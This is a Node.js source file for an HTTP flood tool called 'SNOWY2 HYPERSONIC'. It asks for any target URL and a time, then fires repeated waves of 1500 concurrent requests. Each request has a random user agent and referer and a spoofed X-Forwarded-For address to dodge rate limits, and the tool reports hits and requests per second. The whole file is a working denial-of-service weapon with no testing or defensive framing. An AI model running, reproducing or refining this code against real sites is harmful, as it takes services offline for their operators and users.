const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');

const FIXED_CONCURRENCY = 1500; // Reduced concurrency to 1500
const CPU_COUNT = os.cpus().length;
const REQUEST_TIMEOUT = 8000;

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: Infinity });

function loadLines(file) {
    try {
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .map(l => l.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

function randItem(arr, fallback = '') {
    return arr[Math.floor(Math.random() * arr.length)] || fallback;
}

function randIp() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
        this.fx = ['⚡', '🚀', '💣', '🔥', 'BLAST', 'ZAP', 'RUSH', '⚔️', '⚙️'];
        this.fxIndex = 0;
    }

    async fireRequest() {
        const headers = {
            'User-Agent': randItem(USER_AGENTS, 'Mozilla/5.0'),
            'Referer': randItem(REFERERS, 'https://google.com'),
            'X-Forwarded-For': randIp()
        };

        try {
            await axios.get(this.target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent,
                httpsAgent,
                maxRedirects: 0,
                validateStatus: null,
                decompress: false
            });
            return true;
        } catch {
            return false;
        }
    }

    async boosterThread() {
        while (Date.now() - this.startTime < this.duration) {
            const res = await this.fireRequest();
            this.stats.total++;
            res ? this.stats.success++ : this.stats.errors++;
        }
    }

    async fixedFloodWave() {
        const batch = Array.from({ length: FIXED_CONCURRENCY }, () => this.fireRequest());
        const results = await Promise.allSettled(batch);
        results.forEach(res => {
            this.stats.total++;
            if (res.status === 'fulfilled' && res.value) {
                this.stats.success++;
            } else {
                this.stats.errors++;
            }
        });
    }

    displayLive() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed).toFixed(1);
        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
        const fx = this.fx[this.fxIndex++ % this.fx.length];
        process.stdout.write(`\r${fx} RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`);
    }

    async run() {
        console.log(`\nSNOWY2 HYPERSONIC - ${FIXED_CONCURRENCY} CONC`);
        console.log('='.repeat(60));
        console.log(`TARGET: ${this.target}`);
        console.log(`DURATION: ${this.duration / 1000}s`);
        console.log('='.repeat(60));

        const statTicker = setInterval(() => this.displayLive(), 100);
        const boosters = [this.boosterThread()]; // Just 1x booster thread for now

        while (Date.now() - this.startTime < this.duration) {
            await this.fixedFloodWave();
        }

        clearInterval(statTicker);
        await Promise.allSettled(boosters);
        this.printResults();
    }

    printResults() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = (this.stats.total / elapsed).toFixed(1);
        console.log('\n\nATTACK COMPLETED');
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${this.stats.total}`);
        console.log(`SUCCESS (200): ${this.stats.success}`);
        console.log(`ERRORS: ${this.stats.errors}`);
        console.log(`AVERAGE RPS: ${avgRps}`);
        console.log(`PEAK RPS: ${this.stats.peakRps.toFixed(1)}`);
        console.log('='.repeat(60));
    }
}

// NO QUESTIONS. JUST GO.
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = q => new Promise(res => readline.question(q, res));
    let target = await ask("TARGET: ");
    if (!target.startsWith("http")) target = "http://" + target;
    const time = parseInt(await ask("TIME (seconds): "));
    readline.close();

    if (isNaN(time)) return console.log("Invalid time.");

    const engine = new AttackEngine(target.trim(), time);
    await engine.run();
})();
